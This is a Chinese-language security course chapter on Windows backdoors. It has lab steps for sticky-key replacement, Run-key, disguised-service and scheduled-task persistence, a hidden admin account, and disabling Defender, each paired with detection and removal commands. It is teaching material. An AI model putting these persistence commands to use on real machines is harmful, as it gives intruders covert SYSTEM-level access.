# 07.项目七 Windows应用安全

---

# 📌 课前回顾

本项目以前序项目所建立的服务器运维与安全加固知识为基础，从攻击者视角切入应用层安全问题，建立先验知识桥梁。

**回顾问题：**

1. 项目四中阐述的 IIS 网站安全加固四层纵深防御分别是什么？（日志审计、请求筛选、安全响应头、权限与 HTTPS）
2. 当 Web 服务器的上传目录同时被授予"写入"与"脚本执行"权限时，将产生何种安全后果？
3. Windows Server 中以 SYSTEM 权限运行的服务存在哪些固有安全隐患？
4. 项目六域管理中，攻击者获取 NTDS.dit 数据库后可实施哪些后续攻击？
5. 何为"最小权限原则"？该原则在 IIS 应用程序池配置中如何体现？

🔗

**知识衔接**：前序项目按"服务搭建 → 网站部署 → 安全加固 → 远程管理 → 域管理"构成了完整的服务器运维链。本项目转换视角，从攻击者的角度系统讲解 Windows 应用层的后门植入、WebShell 上传与持久化控制机制——通过理解攻击实现原理，方能制定有针对性的防御策略，这正是"知攻善防"这一信息安全人才核心素养的体现。

⚠️

**声明**：本项目内容仅用于授权环境下的安全教学与攻防演练。严禁对未经授权的系统实施任何渗透测试行为，违者将依法承担相应法律责任。

---

# 🎯 学习目标

| 层次 | 内容 |
| --- | --- |
| 知识 | 理解后门（Backdoor）的定义、分类与工作原理；掌握Windows系统中常见的持久化技术（注册表、计划任务、服务、WMI、粘滞键）；理解WebShell的分类、工作原理与文件上传漏洞利用链；了解木马的分类与反弹Shell的通信原理 |
| 技能 | 能够创建和检测各类Windows持久化后门；能够综合排查系统中的常见启动项与自启动位置；能够上传WebShell并利用其执行远程命令；能够使用PowerShell脚本检测和清除各类后门；能够对IIS进行WebShell防护加固 |
| 素养 | 树立"知攻善防"的安全意识，理解攻防对抗的本质；强化法律意识，明确未授权渗透测试的法律后果；培养应急响应思维——发现后门后如何系统化清除 |

---

# ⚠️ 重难点梳理

| 类型 | 内容 | 说明 |
| --- | --- | --- |
| 重点 | Windows常见持久化技术的原理与实现 | 注册表Run键、计划任务、系统服务、WMI事件订阅、粘滞键替换——理解每种技术的触发机制和运行原理是检测和防御的基础 |
| 重点 | WebShell的分类与一句话木马工作原理 | 理解小马/大马/一句话木马的区别，以及客户端（菜刀/冰蝎/哥斯拉）如何与WebShell通信 |
| 重点 | 后门检测与清除的系统化流程 | 掌握从注册表、计划任务、服务、WMI、网络连接、进程等多维度全面排查后门的方法 |
| 难点 | WMI事件订阅后门的原理与检测 | WMI事件订阅涉及过滤器、消费者、绑定三个组件，理解三者关系和如何彻底清除是难点 |
| 难点 | 免杀技术与现代WebShell对抗 | 理解为什么传统杀软难以检测内存马、加密WebShell等现代攻击技术，以及对应的防御思路（EDR、RASP） |
| 难点 | 文件上传漏洞绕过技术 | 前端验证绕过、Content-Type修改、扩展名黑名单绕过、图片马等技术需要理解后端验证逻辑 |

---

# 任务一 Windows应用后门

## 🧠 理论知识

### 后门（Backdoor）的概念

#### 什么是后门？

**后门**（Backdoor）是指攻击者预先在目标系统中植入的、能够绕过常规身份认证机制的隐蔽访问通道。其功能在于：即便初始的访问凭据失效或被回收，攻击者仍可凭借该通道重新进入系统。

**类比说明**：可将系统的常规登录视为建筑物的正规门禁——用户须通过身份验证方可进入；攻击者在首次入侵后预留的后门，则相当于在隐蔽位置加设的暗门——即使正规门禁的口令被重置，攻击者仍可凭该暗门反复进出。

```
正常的登录流程：
用户 ──输入账号密码──→ 认证系统 ──验证通过──→ 系统资源
                        ✅ 合法

后门的隐蔽通道：
攻击者 ──暗门通道──→ 系统资源
         🔓 绕过认证
```

#### 后门的分类

Windows系统中常见的后门类型：

| 类型 | 说明 | 触发机制 | 示例 |
| --- | --- | --- | --- |
| **账户后门** | 创建隐藏的高权限用户账户 | 使用$符号隐藏账户名 | `net user admin$ P@ss /add` |
| **服务后门** | 以系统服务形式运行恶意程序 | 系统启动时自动运行 | `sc create`创建恶意服务 |
| **注册表后门** | 修改注册表实现开机自启动 | 用户登录时触发 | Run键、RunOnce键 |
| **计划任务后门** | 定时或特定条件下执行恶意任务 | 定时/登录/启动时触发 | `schtasks`创建任务 |
| **WMI事件订阅** | 利用WMI事件触发恶意代码 | 系统事件触发，极难检测 | 永久事件订阅 |
| **DLL劫持** | 替换合法DLL为恶意DLL | 程序启动时加载 | 搜索顺序劫持 |
| **粘滞键后门** | 替换辅助功能程序 | 登录界面按键触发 | sethc.exe替换 |
| **端口复用后门** | 复用合法服务端口建立隐蔽通道 | 网络连接到达时触发 | 复用已有管理端口建立隐蔽通道 |

> 💡 **持久化（Persistence）** 是后门的核心目的。攻击者获取初始访问后，必须建立持久化机制，确保重启、密码更改、补丁更新后仍能重新进入系统。MITRE ATT&CK框架将持久化列为攻击链的关键阶段（TA0003）。

#### 后门攻击链全景图

```
攻击者获取初始访问权限（如利用漏洞、钓鱼邮件、弱密码）
    │
    ├── 1. 权限提升（Privilege Escalation）
    │       本地漏洞利用 → 获取SYSTEM权限
    │
    ├── 2. 植入后门（Persistence） ←── 本任务重点
    │       注册表/计划任务/服务/WMI/DLL劫持
    │
    ├── 3. 横向移动（Lateral Movement）
    │       利用后门跳板访问内网其他机器
    │
    └── 4. 数据窃取/破坏（Impact）
            最终目的
```

---

### 后门技术详解

#### 1. Windows系统服务后门

**原理**：Windows服务在系统启动时自动运行，且以**SYSTEM权限**运行。攻击者可以创建一个伪装成合法服务的恶意服务，实现开机自启动的持久化后门。

**服务的关键属性**：

| 属性    | 说明          | 用于伪装的技巧                            |
| ----- | ----------- | ---------------------------------- |
| 服务名称  | 系统内部标识      | 使用类似系统服务的名称，如`WindowsUpdateHelper` |
| 显示名称  | 服务管理器中显示的名称 | 使用欺骗性的显示名称                         |
| 启动类型  | 自动/手动/禁用    | 设为`auto`（自动）确保开机启动                 |
| 二进制路径 | 服务执行的程序路径   | 指向恶意程序路径                           |
| 描述信息  | 服务描述文本      | 填写看似合法的描述信息                        |
| 运行身份  | 服务运行的账户     | 默认为SYSTEM（最高权限）                    |

```
服务后门的运作机制：
    系统启动
       ↓
    服务控制管理器（SCM）读取注册表
       ↓
    根据Services键下的配置启动服务
       ↓
    以SYSTEM权限运行恶意程序
       ↓
    攻击者获得持久化访问
```

**创建服务后门的命令**：

```powershell
# 创建伪装服务（PowerShell中必须用sc.exe，因为sc是Set-Content的别名）
sc.exe create "WindowsUpdateHelper" binpath="C:\Windows\Temp\malware.exe" start=auto
sc.exe description "WindowsUpdateHelper" "Provides Windows Update support services"
sc.exe start "WindowsUpdateHelper"

# 查看服务配置
sc.exe qc "WindowsUpdateHelper"
sc.exe query "WindowsUpdateHelper"
```

> 🔍 **检测线索**：通过 `sc query type=service state=all` 或 `Get-Service` 查看所有服务，重点关注启动类型为"自动"但名称/描述可疑、二进制路径指向Temp等非常规目录的服务。

---

#### 2. 注册表持久化后门

**原理**：Windows注册表中有多个"自动启动"位置，在这些位置添加恶意程序的路径，即可在用户登录或系统启动时自动执行恶意代码。

**常用注册表持久化路径**：

| 注册表路径                                                | 触发时机       | 适用范围 | 检测难度    |
| ---------------------------------------------------- | ---------- | ---- | ------- |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | 用户登录时      | 所有用户 | ⭐⭐（易）   |
| `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | 用户登录时      | 当前用户 | ⭐⭐（易）   |
| `HKLM\...\CurrentVersion\RunOnce`                    | 下次启动时运行一次  | 所有用户 | ⭐⭐（易）   |
| `HKLM\...\Policies\Explorer\Run`                     | 用户登录时（策略级） | 所有用户 | ⭐⭐⭐（中）  |
| `HKLM\SYSTEM\CurrentControlSet\Services`             | 系统启动       | 服务形式 | ⭐⭐⭐（中）  |
| `HKLM\...\Image File Execution Options`              | 指定进程启动时    | 所有用户 | ⭐⭐⭐⭐（难） |

> 💡 **AppInit_DLLs** 和 **Image File Execution Options (IFEO)** 是更高级的注册表持久化技术。IFEO可以通过设置`Debugger`值来劫持任意进程——当目标程序启动时，实际执行的是攻击者指定的程序。

**注册表Run键的工作原理**：

```
用户输入密码登录Windows
       ↓
Winlogon.exe启动用户Shell（通常是explorer.exe）
       ↓
Explorer.exe读取注册表Run键中的所有值
       ↓
依次执行每个键值对应的程序路径
       ↓
恶意程序被自动启动，以当前用户权限运行
```

---

#### 3. 计划任务后门

**原理**：Windows任务计划程序允许在指定时间、特定事件发生时自动执行程序。攻击者可以创建隐藏的计划任务，实现定时或触发式执行恶意代码。

**计划任务的触发方式**：

| 触发方式 | 说明 | 适用场景 |
| --- | --- | --- |
| 系统启动时（onstart） | 计算机开机后自动执行 | 需要尽早执行的后门 |
| 用户登录时（onlogon） | 用户登录后自动执行 | 以当前用户身份执行 |
| 定时执行（daily/weekly） | 指定时间自动执行 | 定期回连C2服务器 |
| 空闲时（onidle） | 计算机空闲一段时间后执行 | 避免引起用户注意 |
| 事件触发（onevent） | 特定Windows事件发生时执行 | 高级隐蔽触发 |

**创建计划任务后门**：

```powershell
# 开机自启动（SYSTEM权限）
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\malware.exe" /sc onstart /ru SYSTEM /f

# 每天凌晨3点执行（模拟系统维护）
schtasks /create /tn "DiskCleanup" /tr "C:\Windows\Temp\malware.exe" /sc daily /st 03:00 /ru SYSTEM /f

# 用户登录时执行
schtasks /create /tn "UserProfileSync" /tr "C:\Windows\Temp\malware.exe" /sc onlogon /f

# 查看任务详情
schtasks /query /tn "SystemHealthCheck" /fo LIST /v
```

> 🔍 **检测线索**：使用 `schtasks /query /fo TABLE` 或 `Get-ScheduledTask` 列出所有计划任务，重点排查作者非Microsoft、执行路径指向非标准目录、名称模仿系统任务的任务。

---

#### 4. WMI事件订阅后门

**原理**：WMI（Windows Management Instrumentation）是Windows的管理框架，支持事件订阅机制。攻击者可以创建**永久事件订阅**，当特定事件发生时自动执行恶意命令。WMI后门是最高级的持久化技术之一，因为它**不需要在磁盘上存放恶意文件**，完全在WMI数据库中存储。

**WMI事件订阅的三个组件**：

```
WMI事件订阅的运作机制：

┌────────────────────┐     ┌────────────────────┐     ┌──────────────────┐
│   事件过滤器        │     │   事件消费者        │     │   绑定关系        │
│   __EventFilter     │────→│   CommandLineEvent  │────→│  __FilterTo       │
│                     │     │   Consumer          │     │  ConsumerBinding  │
│ 定义"什么事件触发" │     │ 定义"触发后做什么" │     │ 连接过滤器和消费者│
│                     │     │                     │     │                   │
│ 例：每60秒系统性能  │     │ 例：执行恶意程序    │     │ 三者缺一不可      │
│ 数据变化事件        │     │                     │     │                   │
└────────────────────┘     └────────────────────┘     └──────────────────┘

触发流程：
    系统事件发生（如每60秒的性能计数器更新）
       ↓
    WMI检查__EventFilter → 匹配过滤条件
       ↓
    通过__FilterToConsumerBinding找到关联的Consumer
       ↓
    执行CommandLineEventConsumer中指定的命令
       ↓
    恶意代码被执行（无文件落地，极难检测）
```

**WMI后门为什么难以检测？**

| 特征 | 说明 |
| --- | --- |
| 无文件落地 | 恶意代码存储在WMI数据库中，不在文件系统上 |
| 无进程残留 | 只在事件触发时短暂执行，平时无恶意进程 |
| 无注册表Run键 | 不使用常见的启动项，绕过常规检测 |
| 以SYSTEM权限运行 | WMI提供者默认以SYSTEM身份执行 |
| 可跨系统持久化 | 可配置为永久订阅，重启后仍然存在 |

---

#### 5. DLL劫持后门

**原理**：Windows程序在加载DLL时，按照特定的搜索顺序查找DLL文件。攻击者可以将恶意DLL放置在搜索顺序靠前的位置，使程序优先加载恶意DLL而非合法DLL。

**DLL搜索顺序**：

```
Windows DLL搜索顺序（默认）：
    1. 应用程序所在目录          ← 最常被利用
    2. 系统目录（System32）
    3. 16位系统目录
    4. Windows目录
    5. 当前工作目录
    6. PATH环境变量中的目录
```

**攻击场景示例**：

```
某合法程序 C:\Tools\app.exe 启动时需要加载 userenv.dll

攻击者在 C:\Tools\ 盘下放置恶意的 userenv.dll
       ↓
app.exe 启动 → 搜索 userenv.dll
       ↓
优先在应用程序目录找到恶意 userenv.dll → 加载执行
       ↓
恶意DLL在被加载时执行攻击代码，同时转发调用给合法DLL
       ↓
程序正常运行，用户无感知
```

> 🔍 **检测线索**：使用Process Monitor监控程序的DLL加载行为，查找从非标准路径加载的DLL；使用 `signtool` 验证DLL的数字签名是否合法。

---

#### 6. 粘滞键后门（辅助功能后门）

**原理**：Windows登录界面提供辅助功能（如粘滞键sethc.exe、放大镜magnify.exe、屏幕键盘osk.exe、辅助功能管理器utilman.exe等），这些程序以**SYSTEM权限**运行且无需登录即可触发。将其中某个程序替换为cmd.exe后，攻击者可在登录界面直接获得SYSTEM权限的命令行。

```
粘滞键后门的运作机制：
    登录界面（未认证状态）
       ↓
    连续按5次Shift键
       ↓
    Windows启动 C:\Windows\System32\sethc.exe
       ↓
    正常：弹出粘滞键设置对话框
    被替换后：弹出 cmd.exe（以SYSTEM权限运行）
       ↓
    攻击者可在命令行中创建后门账户、修改密码等
```

**权限继承机制**：登录界面的辅助功能由 Winlogon.exe（Windows 登录进程）启动，Winlogon.exe 自身以 SYSTEM 身份运行，因此其所派生的子进程默认继承 SYSTEM 权限——这正是粘滞键后门得以提权的本质原因。

> 💡 **现代防御**：Windows Vista以后的系统已启用**Windows Resource Protection (WRP)**，由TrustedInstaller保护System32目录下的关键文件，即使管理员也无法直接替换。配合**Secure Boot**可进一步限制启动阶段的篡改。但通过WinPE离线环境或先获取TrustedInstaller权限仍可实现类似攻击。

---

## 🛠️ 实践操作

### 实验环境说明

> 本任务的实验操作需要以下环境：
> - **靶机**：Windows Server 2022/2025（虚拟机，实验前创建快照）
> - **攻击机**：Kali Linux（安装Metasploit Framework）
> - **网络**：两台虚拟机处于同一NAT网络，能互相通信
> - **重要提示**：实验前请关闭Windows Defender实时防护，或将其排除实验目录
>
> ⚠️ **Windows Server 2025 特别说明**：
> - Server 2025 默认启用 **VBS（基于虚拟化的安全）** 和增强版 Windows Defender，关闭实时防护需通过组策略：`gpedit.msc` → 计算机配置 → 管理模板 → Windows 组件 → Microsoft Defender 防病毒 → 实时保护 → 启用"关闭实时保护"策略
> - 如果组策略无效，还需关闭"篡改防护"：Windows 安全中心 → 病毒和威胁防护 → 管理设置 → 关闭"篡改防护"（必须先关闭此项，组策略才能生效）
> - Server 2025 的 PowerShell 5.1 仍支持 `Get-WmiObject`，但微软建议使用 `Get-CimInstance` 替代（功能等价，语法略有不同）
> - **PowerShell 中 `sc` 是 `Set-Content` 的别名**，不是服务控制命令！在 PowerShell 中操作服务必须使用 `sc.exe create`、`sc.exe delete` 等完整路径。在 CMD 命令提示符中则可以直接使用 `sc`。

---

### 实验1：Windows "5次Shift" 粘滞键后门

**原理回顾**：登录界面按5次Shift键启动sethc.exe（以SYSTEM权限运行），将其替换为cmd.exe即可在登录界面获得SYSTEM命令行。

> ⚠️ **Server 2025 兼容性说明**：Windows Server 2025 默认启用 Credential Guard 和 VBS（基于虚拟化的安全），系统文件保护更强。如果 `takeown` 和 `icacls` 命令执行后仍无法替换 sethc.exe，需要在虚拟机设置中关闭 VBS：`bcdedit /set hypervisorlaunchtype off` 并重启，或通过 WinPE 启动盘离线替换文件。教学环境中建议在安装系统时不启用 VBS 功能。

**操作步骤**：

**第一步：以管理员身份替换系统文件**

```powershell
# 需要以管理员身份运行PowerShell

# 查看原sethc.exe的文件信息
Get-Item C:\Windows\System32\sethc.exe | Select-Object Name, Length, LastWriteTime

# 备份原文件
Copy-Item C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak

# 获取文件所有权（默认受TrustedInstaller保护）
takeown /f C:\Windows\System32\sethc.exe /a

# 授予管理员完全控制权限
icacls C:\Windows\System32\sethc.exe /grant administrators:F

# 替换为cmd.exe
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe -Force
```

> ⚠️ **预期结果**：每条命令执行后无报错即为成功。`takeown` 应输出"成功: 文件(或文件夹): ... 现在由 administrators 组拥有"。`icacls` 应输出"已成功处理 1 个文件"。

**第二步：验证后门**

1. 注销当前用户，回到登录界面（或锁定屏幕）
2. 连续快速按5次 **Shift** 键
3. 如果后门成功，将弹出以SYSTEM权限运行的命令提示符窗口
4. 在命令行中验证权限：

```cmd
whoami
:: 预期输出：nt authority\system

:: 创建后门管理员账户（演示用途）
net user backdoor P@ssw0rd123 /add
net localgroup administrators backdoor /add
```

**第三步：恢复原文件**

```powershell
# 恢复原始sethc.exe
Copy-Item C:\Windows\System32\sethc.exe.bak C:\Windows\System32\sethc.exe -Force

# 恢复文件权限
icacls C:\Windows\System32\sethc.exe /reset

# 删除后门账户（如果创建了）
net user backdoor /delete
```


**界面方式恢复**：
1. 打开"文件资源管理器"，导航到 `C:\Windows\System32\`
2. 找到 `sethc.exe.bak`，右键 → 重命名为 `sethc.exe`（覆盖当前文件）
3. 如果提示权限不足，右键 `sethc.exe` → 属性 → 安全 → 高级 → 更改所有者为 Administrators

> 🛡️ **最简单有效的防御**：通过注册表 IFEO（映像文件执行选项）阻止 sethc.exe 被利用。打开 `regedit`，导航到 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`，新建项 `sethc.exe`，在该项下新建字符串值 `Debugger`，数据留空。这样即使 sethc.exe 被替换，系统也不会执行它。同样的方法可应用于 `utilman.exe`、`osk.exe`、`magnify.exe` 等其他辅助功能程序。此方法在 Windows Server 2016~2025 所有版本上均有效。

**防御措施**：

| 防御方法 | 说明 |
| --- | --- |
| 启用Secure Boot | 防止在启动阶段篡改系统文件 |
| Windows Resource Protection (WRP) | TrustedInstaller保护System32关键文件 |
| 启用BitLocker磁盘加密 | 防止通过WinPE离线替换文件 |
| 监控System32文件哈希变化 | 使用文件完整性监控工具（FIM） |

---

### 实验2：注册表Run键后门

**操作步骤**：

**第一步：创建注册表后门**

> 💡 **说明**：注册表 Run 键仅记录"登录时所执行的程序路径"，目标程序是否存在不影响注册表项的写入。本实验聚焦于注册表后门的**创建、检测、清除**完整流程，因此先创建一个无害的占位程序用于演示。

```powershell
# 创建模拟后门程序（仅写日志，无恶意行为）
Set-Content -Path "C:\Windows\Temp\backdoor.exe" -Value "echo backdoor > C:\Windows\Temp\backdoor.log" -Encoding ASCII
```

**命令行方式**：

```powershell
# 方法一：使用reg命令
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# 方法二：使用PowerShell cmdlet
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "SystemHealthMonitor" `
    -Value "C:\Windows\Temp\backdoor.exe" `
    -PropertyType String -Force

# 验证后门已创建
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

> ⚠️ **预期结果**：`reg add` 命令提示"操作成功完成"。`Get-ItemProperty` 输出中应包含刚添加的 `WindowsUpdateHelper` 和 `SystemHealthMonitor` 键值，其数据指向 `C:\Windows\Temp\backdoor.exe`。

**界面方式（注册表编辑器）**：

1. 按 `Win+R`，输入 `regedit`，回车打开注册表编辑器
2. 左侧导航到：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
3. 右侧空白区域右键 → 新建 → 字符串值
4. 名称输入：`WindowsUpdateHelper`
5. 双击该值，数据输入：`C:\Windows\Temp\backdoor.exe`
6. 确定保存，即可看到新增的启动项

**第二步：检测注册表后门**

**界面方式（注册表编辑器）**：

1. 打开 `regedit`，导航到 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
2. 右侧面板中逐一检查每个值，关注：名称看似系统服务但路径指向 `Temp`、`AppData` 等非标准目录的项
3. 同样检查 `RunOnce`、`HKCU\...\Run` 等其他自启动位置

**命令行方式**：

```powershell
# 检查所有常见的注册表自启动位置
$autorunPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
)

foreach ($path in $autorunPaths) {
    Write-Host "`n=== $path ===" -ForegroundColor Yellow
    if (Test-Path $path) {
        Get-ItemProperty -Path $path | Format-List
    } else {
        Write-Host "路径不存在" -ForegroundColor Gray
    }
}
```

**第三步：清除注册表后门**

**界面方式（注册表编辑器）**：

1. 打开 `regedit`，导航到 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
2. 右键选中可疑的值（如 `WindowsUpdateHelper`）→ 删除
3. 确认删除

**命令行方式**：

```powershell
# 删除恶意启动项
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper"
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemHealthMonitor"

# 验证已清除
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List
```

> 🛡️ **最简单有效的防御**：使用 Windows 自带的 `msconfig`（系统配置）工具。按 `Win+R` 输入 `msconfig` → 切换到"启动"选项卡，可以直观查看并禁用所有自启动项。Windows 10/11 中该功能已整合到"任务管理器"的"启动"选项卡中，右键可直接禁用可疑项。

---

### 实验3：系统服务后门

**操作步骤**：

**第一步：创建模拟后门程序**

> 真实攻击中，后门程序通常由 msfvenom 或类似工具生成。教学环境采用无害脚本进行模拟，重点在于理解服务后门的创建、检测与清除流程。

```powershell
# 创建一个模拟后门程序（实际只是写日志，无恶意行为）
$script = @'
@echo off
:loop
echo [%date% %time%] Backdoor running >> C:\Windows\Temp\backdoor.log
timeout /t 60 /nobreak >nul
goto loop
'@
Set-Content -Path "C:\Windows\Temp\backdoor.bat" -Value $script -Encoding ASCII

# 用bat包装为可被服务调用的形式（服务需要响应SCM，此处简化演示）
Set-Content -Path "C:\Windows\Temp\backdoor.exe" -Value "placeholder" -Encoding ASCII
```

> 💡 **说明**：Windows 服务要求其可执行文件实现 SCM（服务控制管理器）通信接口；普通 exe 或 bat 直接注册为服务时启动将报错 1053（服务未及时响应）。此现象不影响本实验的教学目标——即掌握可疑服务的**创建、检测、删除**流程。真实攻击场景中，攻击者所使用的木马已完成 SCM 接口实现。

**第二步：创建服务后门**

**命令行方式**：

```powershell
# 创建伪装的系统服务（PowerShell中必须用sc.exe）
sc.exe create "SystemDiagnostic" binpath="C:\Windows\Temp\backdoor.exe" start=auto displayname="System Diagnostic Service"
sc.exe description "SystemDiagnostic" "Monitors system health and performance metrics"

# 尝试启动服务（预期会报错1053，因为模拟程序未实现SCM接口，这是正常的）
sc.exe start "SystemDiagnostic"

# 查看服务配置详情（重点关注：即使服务未成功启动，后门配置已写入注册表）
sc.exe qc "SystemDiagnostic"
sc.exe query "SystemDiagnostic"
```

> ⚠️ **预期结果**：`sc qc` 会显示服务的 BINARY_PATH_NAME 指向 `C:\Windows\Temp\backdoor.exe`，START_TYPE 为 AUTO_START。`sc start` 可能报错1053（服务未及时响应），这不影响实验——关键是理解服务配置已被写入系统。

**界面方式（服务管理器）**：

1. 按 `Win+R`，输入 `services.msc`，回车打开服务管理器
2. 查看服务列表，可以看到新创建的 "System Diagnostic Service"
3. 双击该服务，可查看其属性：启动类型（自动）、可执行文件路径、描述等
4. 注意观察：该服务的"可执行文件的路径"指向 `C:\Windows\Temp\` 目录——这是明显的异常特征

**第二步：检测可疑服务**

**界面方式（服务管理器）**：

1. 按 `Win+R`，输入 `services.msc`，回车
2. 点击"启动类型"列标题排序，筛选出所有"自动"启动的服务
3. 逐一检查：重点关注描述模糊、发布者为空、可执行文件路径指向 `Temp`/`AppData`/`Users` 等非标准目录的服务
4. 右键可疑服务 → 属性 → 查看"可执行文件的路径"

**命令行方式**：

```powershell
# 列出所有自动启动的服务
Get-Service | Where-Object {$_.StartType -eq "Automatic"} | Format-Table Name, DisplayName, Status, StartType

# 检查非Microsoft服务（重点关注）
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike "*System32*" -and
    $_.PathName -notlike "*SysWOW64*" -and
    $_.PathName -notlike "*Program Files*"
} | Select-Object Name, DisplayName, PathName, StartMode | Format-Table -AutoSize

# 检查服务的可执行文件数字签名
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"',''
    if (Test-Path $path) {
        $sig = Get-AuthenticodeSignature $path
        if ($sig.Status -ne "Valid") {
            [PSCustomObject]@{
                ServiceName = $_.Name
                Path = $path
                SignatureStatus = $sig.Status
            }
        }
    }
}
```

**第三步：清除服务后门**

**界面方式（服务管理器）**：

1. 打开 `services.msc`，找到可疑服务 "System Diagnostic Service"
2. 右键 → 停止（先停止服务运行）
3. 右键 → 属性 → 启动类型改为"禁用"
4. 服务管理器无法直接删除服务，需使用命令行 `sc delete` 完成删除

**命令行方式**：

```powershell
# 停止并删除恶意服务
sc.exe stop "SystemDiagnostic"
sc.exe delete "SystemDiagnostic"

# 删除恶意文件
Remove-Item "C:\Windows\Temp\backdoor.exe" -Force -ErrorAction SilentlyContinue
```

> 🛡️ **最简单有效的防御**：启用 Windows Defender 的"篡改防护"（Tamper Protection）功能。打开 Windows 安全中心 → 病毒和威胁防护 → 管理设置 → 开启"篡改防护"。该功能会阻止非授权程序修改安全设置和创建可疑服务。同时，定期使用 `Autoruns`（微软 Sysinternals 工具）检查所有自启动服务。

---

### 实验4：计划任务后门

**操作步骤**：

**第一步：创建计划任务后门**

> 💡 **说明**：计划任务仅记录"在何种条件下执行何种程序"，目标程序是否存在不影响任务的注册。本实验聚焦于计划任务后门的创建、检测与清除完整流程。

**命令行方式**：

```powershell
# 先创建一个模拟后门脚本（用于验证任务确实被触发）
Set-Content -Path "C:\Windows\Temp\backdoor.bat" -Value '@echo %date% %time% >> C:\Windows\Temp\task_triggered.log' -Encoding ASCII

# 开机自启动（SYSTEM权限）
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\backdoor.bat" /sc onstart /ru SYSTEM /f

# 每天凌晨3点执行
schtasks /create /tn "DiskCleanupTask" /tr "C:\Windows\Temp\backdoor.bat" /sc daily /st 03:00 /ru SYSTEM /f

# 用户登录时执行
schtasks /create /tn "UserProfileSync" /tr "C:\Windows\Temp\backdoor.bat" /sc onlogon /f

# 验证计划任务已创建
schtasks /query /tn "SystemHealthCheck" /fo LIST /v
```

> ⚠️ **预期结果**：三条命令均提示"成功: 成功创建计划任务"。`schtasks /query` 会显示任务名称、下次运行时间、状态（就绪）、要运行的任务路径等信息。

**界面方式（任务计划程序）**：

1. 按 `Win+R`，输入 `taskschd.msc`，回车打开任务计划程序
2. 左侧选择"任务计划程序库"
3. 右侧"操作"面板 → 点击"创建基本任务"
4. 名称输入：`SystemHealthCheck`，描述随意填写，下一步
5. 触发器选择"计算机启动时"，下一步
6. 操作选择"启动程序"，程序路径填 `C:\Windows\Temp\backdoor.exe`，下一步
7. 勾选"打开属性对话框"，完成
8. 在属性对话框中，勾选"使用最高权限运行"，确定

**第二步：检测可疑计划任务**

**界面方式（任务计划程序）**：

1. 打开 `taskschd.msc`，展开左侧"任务计划程序库"
2. 逐一检查每个任务：右键 → 属性
3. 重点关注"操作"选项卡中程序路径指向 `Temp`、`AppData` 等非标准目录的任务
4. 检查"常规"选项卡中"使用最高权限运行"且作者非 Microsoft 的任务
5. 检查"触发器"选项卡中设置为"启动时"或"登录时"的可疑任务

**命令行方式**：

```powershell
# 列出所有非Microsoft的计划任务
Get-ScheduledTask | Where-Object {$_.Author -notlike "Microsoft*" -and $_.Author -ne $null} |
    Select-Object TaskName, TaskPath, State, @{N="Author";E={$_.Author}} |
    Format-Table -AutoSize

# 列出所有以SYSTEM权限运行的计划任务
Get-ScheduledTask | Where-Object {
    $_.Principal.UserId -eq "SYSTEM" -or $_.Principal.UserId -eq "NT AUTHORITY\SYSTEM"
} | Select-Object TaskName, TaskPath, State |
    Format-Table -AutoSize

# 查看所有任务的详细信息（包括执行的程序路径）
Get-ScheduledTask | Get-ScheduledTaskInfo | Format-Table TaskName, LastRunTime, NextRunTime -AutoSize
```

**第三步：清除计划任务后门**

**界面方式（任务计划程序）**：

1. 打开 `taskschd.msc`，在任务列表中找到可疑任务（如 `SystemHealthCheck`）
2. 右键该任务 → 删除，确认删除
3. 重复操作删除其他可疑任务

**命令行方式**：

```powershell
# 删除恶意计划任务
schtasks /delete /tn "SystemHealthCheck" /f
schtasks /delete /tn "DiskCleanupTask" /f
schtasks /delete /tn "UserProfileSync" /f

# 验证清除结果
Get-ScheduledTask | Where-Object {$_.TaskName -in @("SystemHealthCheck","DiskCleanupTask","UserProfileSync")} | Select-Object TaskName, State
```

> 🛡️ **最简单有效的防御**：通过组策略限制计划任务的创建权限。打开 `gpedit.msc` → 计算机配置 → Windows 设置 → 安全设置 → 本地策略 → 用户权限分配 → "作为批处理作业登录"，仅保留必要的账户。同时开启"对象访问审核"策略，监控计划任务的创建和修改事件（事件ID 4698/4702）。

---

### 实验5：Windows 常见启动项综合排查与清除

> 本实验不再引入新的后门类型，而是将注册表、计划任务、服务、启动文件夹等自启动位置进行系统化整合，构建完整的排查方法论。

**第一步：认识常见启动项位置**

Windows 中常见的自启动位置包括：

- 注册表 Run / RunOnce 键
- 启动文件夹（当前用户 / 所有用户）
- 计划任务
- 自动启动服务
- 登录脚本与策略启动项

**第二步：界面方式排查启动项**

1. 按 `Ctrl+Shift+Esc` 打开任务管理器，切换到“启动应用”选项卡
2. 观察是否存在名称可疑、发布者未知、启动影响高的项目
